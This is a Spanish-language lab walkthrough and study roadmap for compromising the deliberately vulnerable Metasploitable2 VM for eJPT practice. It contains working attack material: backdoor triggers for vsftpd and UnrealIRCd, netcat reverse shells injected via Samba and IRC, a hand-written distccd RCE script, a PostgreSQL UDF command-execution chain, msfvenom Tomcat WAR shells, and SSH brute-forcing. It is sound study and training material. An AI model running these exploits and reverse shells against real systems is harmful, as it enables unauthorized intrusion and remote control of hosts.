# Metasploitable2 — Mini Roadmap

## 1. Recon completo
- [ ] Full port/service scan con `nmap -sC -sV -p- <ip>`
- [ ] Guarda el resultado — vas a volver a él en cada paso

```sh

```

## 2. Samba 3.X (SMB)
- [ ] Enumera shares con `smbclient -L //<ip>/` y `enum4linux -a <ip>`
- [ ] Identifica la versión exacta y busca el exploit `usermap_script` manualmente (sin Metasploit primero)
- [ ] Logra RCE y documenta el payload que usaste

```sh

```

## 3. UnrealIRCd 3.2.8.1
- [ ] Conéctate manualmente al puerto IRC y confirma la versión por banner
- [ ] Investiga el backdoor del binario (trigger por comando específico)
- [ ] Obtén shell con netcat, sin usar el módulo automático

```sh

```

## 4. distccd
- [ ] Identifica el servicio corriendo en el puerto por defecto (3632)
- [ ] Investiga cómo distcc permite ejecutar comandos arbitrarios por diseño inseguro
- [ ] Logra RCE manualmente

```sh

```

## 5. Java RMI (registry inseguro)
- [ ] Detecta el servicio RMI expuesto
- [ ] Investiga deserialización insegura en ese puerto
- [ ] Compara: ¿qué tan distinto es este vector de los anteriores (RCE por protocolo binario, no HTTP/CLI)?

```sh

```

## 6. MySQL / PostgreSQL con creds default
- [ ] Conéctate con credenciales por defecto (`root`/sin pass, `postgres`/`postgres`)
- [ ] Enumera bases de datos y usuarios
- [ ] Si tienes `FILE` privilege en MySQL, intenta la técnica UDF que ya dominas en Touch, pero con `.so` en Linux en vez de `.dll`
- [ ] En PostgreSQL, investiga `COPY ... TO PROGRAM` como vector de RCE (totalmente distinto a MySQL UDF)

```sh

```

## 7. Tomcat con credenciales default
- [ ] Accede al Manager con `tomcat`/`tomcat` o similar
- [ ] Empaqueta un `.war` malicioso a mano (no uses el módulo automatizado)
- [ ] Despliega y obtén shell

```sh

```

## 8. PHP CGI / phpMyAdmin antiguo
- [ ] Busca vulnerabilidades de inyección de argumentos en PHP-CGI
- [ ] Revisa si hay un phpMyAdmin con versión vulnerable a RCE/LFI

```sh

```

## 9. NFS mal configurado
- [ ] Enumera shares con `showmount -e <ip>`
- [ ] Monta sin autenticación y explora qué queda expuesto
- [ ] ¿Hay algo ahí que sirva para moverte lateralmente o escalar?

```sh

```

## 10. Privilege Escalation interno (una vez tengas shell de bajo privilegio en cualquiera de los anteriores)
- [ ] Enumera binarios SUID: `find / -perm -4000 -type f 2>/dev/null`
- [ ] Revisa cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
- [ ] Chequea el kernel version y busca si hay un exploit local conocido para esa versión específica
- [ ] Documenta la cadena completa: foothold → user → root

```sh

```

---

**Regla de oro:** en cada paso, intenta primero la vía manual (sin `use exploit/...`) y solo usa el módulo de Metasploit al final para comparar — ahí es donde se fija el aprendizaje real para eJPT+.

## 1. Recon completo
```sh
nmap -sC -sV -p- 192.168.58.128 -oN metasploitable2.txt
```

```
21/tcp    open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.58.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2026-11-06T14:48:16+00:00; 0s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      39237/tcp   mountd
|   100005  1,2,3      43597/udp   mountd
|   100021  1,3,4      45499/tcp   nlockmgr
|   100021  1,3,4      60092/udp   nlockmgr
|   100024  1          40406/tcp   status
|_  100024  1          46930/udp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: Speaks41ProtocolNew, ConnectWithDatabase, Support41Auth, SwitchToSSLAfterHandshake, SupportsTransactions, LongColumnFlag, SupportsCompression
|   Status: Autocommit
|_  Salt: 8cjkZaYzxn=&C^/ph:(X
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-11-06T14:48:25+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39237/tcp open  mountd      1-3 (RPC #100005)
40406/tcp open  status      1 (RPC #100024)
45499/tcp open  nlockmgr    1-4 (RPC #100021)
53488/tcp open  java-rmi    GNU Classpath grmiregistry
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-11-06T09:48:06-05:00
|_clock-skew: mean: 1h15m00s, deviation: 2h30m01s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds

```

## 2. FTP
Se ve que existe el servicio FTP, con versión vsftpd 2.3.4. Esta versión es vulnerable, permitiendo obtener una shell con privilegios root.

En la terminal 1, ingresamos cualquier nombre y agregamos al final `:)`:
```sh
ftp 192.168.58.128
# Username: test:)
# Password: Anything
```

Luego de esto, abrimos otra terminal y colocamos el comando:
```sh
nc -nv 192.168.58.128 6200
```

Pareciera que no ocurre nada, pero en esta misma terminal hacemos un `whoami`, y nos dice que somos root. Así que este servicio está: explotado.

## 3. SSH
Podemos ver que existe el protocolo SSH con versión 4.7. Esta versión es muy antigua, así que probablemente tenga exploits conocidos. 

Encontramos una vulnerabilidad vinculada a versiones anteriores a SSH 7.7 (CVE-2018-15473).

En Metasploit existe un módulo para enumerar usuarios:
```sh
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.58.128
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run

[+] 192.168.58.128:22 - SSH - User 'root' found
[+] 192.168.58.128:22 - SSH - User 'mysql' found
[+] 192.168.58.128:22 - SSH - User 'user' found
[+] 192.168.58.128:22 - SSH - User 'ftp' found
```

Probamos el usuario root y le hacemos fuerza bruta:
```sh
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.58.128
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCCESS true
run
```

## 3. Telnet

## 4. SMTP 

## 5. HTTP

## 6. RPC

## 7. SMB + Escalado de privilegios

```sh
smbclient -L //192.168.58.128/

nonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

smbclient //192.168.58.128/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov  6 12:25:37 2026
  ..                                 DR        0  Sun May 20 15:36:12 2012
  .ICE-unix                          DH        0  Fri Nov  6 11:04:49 2026
  .X11-unix                          DH        0  Fri Nov  6 11:04:49 2026
  .X0-lock                           HR       11  Fri Nov  6 11:04:49 2026
  5190.jsvc_up                        R        0  Fri Nov  6 11:04:55 2026

get .X0-lock

msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.58.128
set LHOST 192.168.58.50
set payload cmd/unix/reverse
run

whoami
root
```

De forma manual, se puede hacer de la siguiente forma. En la terminal 1, nos ponemos en escucha con el comando:
```sh
nc -lvnp 4444
```

Y en la terminal 2 ponemos:
```sh
smbclient //192.168.58.128/tmp -U '//=`nohup nc -e /bin/bash 192.168.58.50 4444`'
```

Y luego, en la terminal 1, vemos que se ha producido una conexión y colocamos "whoami", ya teniendo permisos root.

Encontramos dentro de `/home/user/.ssh` un `id_rsa`. Lo copiamos a nuestra máquina y:

```sh
python3 -m venv ssh-dsa-venv
source ssh-dsa-venv/bin/activate
pip install "paramiko==2.11.0"
nano connect_dsa.py
```

```py
import paramiko

key = paramiko.DSSKey.from_private_key_file("id_rsa")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect("192.168.58.128", username="user", pkey=key)

stdin, stdout, stderr = client.exec_command("whoami; id")
print(stdout.read().decode())
client.close()
```

```sh
python3 -W ignore connect_dsa.py
```

Esto no funciona porque no necesariamente funciona con `user`.

```py
import paramiko

key = paramiko.DSSKey.from_private_key_file("id_rsa")

usuarios = ["root", "msfadmin", "service", "postgres", "www-data", "ftp", "backup"]

for u in usuarios:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect("192.168.58.128", username=u, pkey=key, timeout=10, auth_timeout=10)
        print(f"[+] Éxito con usuario: {u}")
        stdin, stdout, stderr = client.exec_command("whoami; id")
        print(stdout.read().decode())
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Falló: {u}")
    except Exception as e:
        print(f"[-] Error con {u}: {e}")
    finally:
        client.close()
```

```
/home/mapacheroja/metasploitable2/ssh-dsa-venv/lib/python3.14/site-packages/paramiko/pkey.py:82: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  "cipher": algorithms.TripleDES,
/home/mapacheroja/metasploitable2/ssh-dsa-venv/lib/python3.14/site-packages/paramiko/transport.py:253: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  "class": algorithms.TripleDES,
[-] Falló: root
[+] Éxito con usuario: msfadmin
msfadmin
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
```

Confirmamos que la clave pertenece a `msfadmin`, no a `user`. Ahora revisamos si tiene privilegios de sudo:

```py
import paramiko
import time

key = paramiko.DSSKey.from_private_key_file("id_rsa")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect("192.168.58.128", username="msfadmin", pkey=key, timeout=10, auth_timeout=10)

channel = client.get_transport().open_session()
channel.get_pty()
channel.settimeout(15)
channel.exec_command("sudo -S -l")

time.sleep(1)
channel.send("msfadmin\n")

time.sleep(2)
output = ""
while channel.recv_ready():
    output += channel.recv(4096).decode(errors="ignore")

print(output)
client.close()
```

Nota: usamos `get_pty()` en vez de `exec_command` normal porque `sudo` en este sistema requiere un TTY real para mostrar el prompt de contraseña (`requiretty`); sin eso, el comando se queda colgado indefinidamente esperando abrir un terminal que nunca existe.

```sh
python3 -W ignore connect_dsa.py
```

```
--- stdout ---
User msfadmin may run the following commands on this host:
    (ALL) ALL

--- stderr ---
[sudo] password for msfadmin:
```

`msfadmin` tiene sudo total (`(ALL) ALL`), así que la escalación a root es directa. Confirmamos:

```py
channel.exec_command("sudo -S whoami; sudo -S id")
```

```
[sudo] password for msfadmin:
root
uid=0(root) gid=0(root) groups=0(root)
```

Root confirmado.

## Lecciones aprendidas
- Un `id_rsa` encontrado en el home de un usuario no necesariamente es la clave *de ese usuario* — puede pertenecer a otra cuenta (vector de pivoteo lateral clásico).
- Claves DSA están deprecadas y muchos clientes OpenSSH modernos las rechazan por completo (`Bad key types '+ssh-dss'`), incluso forzando el algoritmo por flags. `paramiko` en Python es una alternativa viable cuando el cliente nativo no soporta el algoritmo.
- `sudo` vía `exec_command` de paramiko se cuelga sin aviso si el sistema tiene `requiretty` — usar `get_pty()` + `channel.send()`/`recv()` en vez de `stdin.write()`/`stdout.read()` evita el hang.

## 8. 512, 513, 514   
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped

## 9. Java-rmi (1099)

## 10. Bindshell (1524)

```sh
nc 192.168.58.128 1524
```

## 11. NFS (2049)

```sh
showmount -e 192.168.58.128
mkdir /tmp/nfs_mnt
sudo mount -t nfs 192.168.58.128:/ /tmp/nfs_mnt -o nolock,vers=3
# No funciona

rpcinfo -p 192.168.58.128
```

El `showmount` nos mostró el export sin ninguna restricción:

Export list for 192.168.58.128:
/ *


Eso solo ya es el hallazgo real: cualquier host puede montar la raíz del filesystem del target sin autenticación ni restricción por IP. En un entorno de producción esto es crítico — permitiría leer/escribir archivos sensibles, y si hay `no_root_squash` habilitado, incluso escalar a root inyectando una `authorized_keys` o un binario SUID desde afuera.

El `mount` en sí nos dio problemas, pero fueron de nuestro entorno de laboratorio (WSL2 + VMware anidado), no del target. Fuimos descartando capa por capa:

**1. Firewall de Windows bloqueando el tráfico:**
```sh
Set-NetFirewallProfile -All -Enabled False
```
Tras desactivarlo pasamos de timeout a `Input/output error` — avance, pero seguía fallando.

**2. Forzar TCP en vez de UDP** (NFSv3 negocia `mountd` por UDP por defecto, y nuestra red venía con pérdida de paquetes intermitente):
```sh
sudo mount.nfs -v 192.168.58.128:/ /tmp/nfs_mnt -o nolock,vers=3,proto=tcp,mountproto=tcp
```
Seguía en timeout.

**3. Confirmar que no era un problema de conectividad general:**
```sh
rpcinfo -p 192.168.58.128     # confirma mountd/nfs escuchando y en qué puertos
ping -c 5 192.168.58.128      # 0% packet loss
nc -zv 192.168.58.128 2049    # puerto NFS abierto
nc -zv 192.168.58.128 39237   # puerto mountd (TCP) abierto
rpcinfo -T tcp 192.168.58.128 100005 3   # RPC responde: "program 100005 version 3 ready and waiting"
```
Todo esto funcionó limpio — la capa de TCP crudo y RPC respondían bien, así que el problema estaba más arriba, en el `mount(2)` del kernel.

**4. Sospecha de MTU/fragmentación** (paquetes chicos como ping/RPC NULL pasan, pero el intercambio real del mount usa payloads más grandes):
```sh
sudo ip link set eth4 mtu 1400
sudo mount.nfs -v 192.168.58.128:/ /tmp/nfs_mnt -o nolock,vers=3,proto=tcp,mountproto=tcp,rsize=1024,wsize=1024
```
Mismo resultado: `mount(2): Connection timed out`.

**Conclusión:** descartamos firewall, protocolo (TCP vs UDP), tamaño de paquete y MTU — todo apunta a una limitación del cliente NFS del kernel bajo WSL2 en este setup de red anidado (WSL2 ↔ VMware), no a una protección del lado del target. El hallazgo de la mala configuración del export queda confirmado igual vía `showmount`; el mount en sí quedó bloqueado por el entorno de laboratorio.


## 12. FTP (2121) ProFTPD 1.3.1

## 13. MySQL (3306) MySQL 5.0.51a-3ubuntu5

## 14. Distccd (3632)

### Metasploit
```
search distccd
use 0
set RHOSTS 192.168.58.128
set payload cmd/unix/reverse_perl
run

ls
```

### Manual
```sh
import socket, sys

def dist_cmd(args):
    args = args + ["#", "-c", "main.c", "-o", "main.o"]  # disfraz de compilación
    res = "DIST00000001" + "ARGC%08x" % len(args)
    for arg in args:
        res += "ARGV%08x%s" % (len(arg), arg)
    return res.encode()

def recv_exact(s, n):
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data

def exploit(ip, port, command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ip, port))

    s.sendall(dist_cmd(["sh", "-c", command]))

    dtag = "AAAAAAAAAA"  # relleno de 10 bytes, cualquier ascii sirve
    s.sendall(("DOTI%08x%s\n" % (len(dtag), dtag)).encode())

    ack = recv_exact(s, 24)
    if len(ack) != 24:
        print("[-] distccd no respondió")
        return

    for label in ("stderr", "stdout"):
        tag = recv_exact(s, 4)
        length = int(recv_exact(s, 8), 16)
        if length:
            data = recv_exact(s, length)
            print(f"[{label}] {data.decode(errors='ignore')}")

    s.close()

if __name__ == "__main__":
    exploit(sys.argv[1], 3632, sys.argv[2])
```

Y se ejecuta con el comando `python3 distcc_manual.py 192.168.58.128 "whoami"`.

## 15. PostgreSQL (5432)
```sh
sudo -u postgres psql -h 192.168.58.128
# Sin contraseña

SELECT datname FROM pg_database;
\c postgres
```

### Metasploit
```
msfconsole
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.58.128
set LHOST 192.168.58.50
run

shell
```

### Manual

```sh
searchsploit postgres
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
PnPSCADA v2.x - Unauthenticated PostgreSQL Injection                                  | hardware/webapps/51448.txt
PostgreSQL - 'bitsubstr' Buffer Overflow                                              | linux/dos/33571.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                          | immunix/local/19875.txt
PostgreSQL 7.x - Multiple Vulnerabilities                                             | linux/dos/25076.c
PostgreSQL 8.01 - Remote Reboot (Denial of Service)                                   | multiple/dos/946.c
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                    | linux/local/7855.txt
PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                       | linux/dos/32849.txt
PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                           | multiple/local/32847.txt
PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service             | multiple/dos/33729.txt
PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                     | multiple/remote/46813.rb
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                     | multiple/remote/50847.py
PostgreSQL 9.4-0.5.3 - Privilege Escalation                                           | linux/local/45184.sh
PostgreSQL 9.6.1 - Remote Code Execution (RCE) (Authenticated)                        | multiple/remote/51247.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

searchsploit -m linux/local/7855.txt
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/7855.tar.gz
tar xzf 7855.tar.gz

psql -h 192.168.58.128 -U postgres
\lo_import '/home/mapacheroja/metasploitable2/lib_postgresqludf_sys/lib_postgresqludf_sys.so'
SELECT lo_export(16388, '/tmp/pgudfsys.so');
CREATE OR REPLACE FUNCTION sys_eval(cstring) RETURNS int4 AS '/tmp/pgudfsys.so', 'sys_eval' LANGUAGE C STRICT;
SELECT sys_eval(';id > /tmp/out.txt 2>&1');
```

## 15. VNC 3.3
```
sudo apt install tigervnc-viewer -y
vncviewer 192.168.58.128:5900

# Password: password
```

## 16. X11

## 17. UnrealIRCd (6667/6697)

### Metasploit
```sh
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.58.128
set RPORT 6667
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.58.50
set LPORT 4444
run
```

### Manual
```sh
searchsploit unrealircd

----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                           | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                         | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                              | windows/dos/27407.pl
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# Terminal 1
nc -lvnp 4444

# Terminal 2
echo -e "AB; /bin/nc -e /bin/sh 192.168.58.50 4444\n" | nc 192.168.58.128 6667
```
## 18. Apache Jserv

## 19. Apache Tomcat/Coyote JSP engine 1.1 (8180)

Credenciales por default tomcat:tomcat
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.58.50 LPORT=4444 -f war > shell.war

# Terminal 1
nc -lvnp 4444
```

En el Manager, baja hasta la sección “WAR file to deploy”, selecciona shell.war y dale a Deploy.

```
unzip -l shell.war

http://192.168.58.128:8180/shell/<nombre-exacto>.jsp
```

Pero no funciona, así que mejor ocupamos una bind shell:
```sh
msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > shell_bind.war
```

Hacemos deploy de este archivo y vemos el nombre del `.jsp` que hay dentro:

```sh
unzip -l shell_bind.war

# rkbgzkrhu.jsp
```

```
http://192.168.58.128:8180/shell_bind/rkbgzkrhu.jsp
```

Y nos conectamos al target:
```sh
nc 192.168.58.128 4444
```

## X. Java-RMI

```sh
msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.58.128
set RPORT 53488
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.58.50
set LPORT 4444
run
```

```
6000/tcp  open  X11         (access denied)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39237/tcp open  mountd      1-3 (RPC #100005)
40406/tcp open  status      1 (RPC #100024)
45499/tcp open  nlockmgr    1-4 (RPC #100021)
```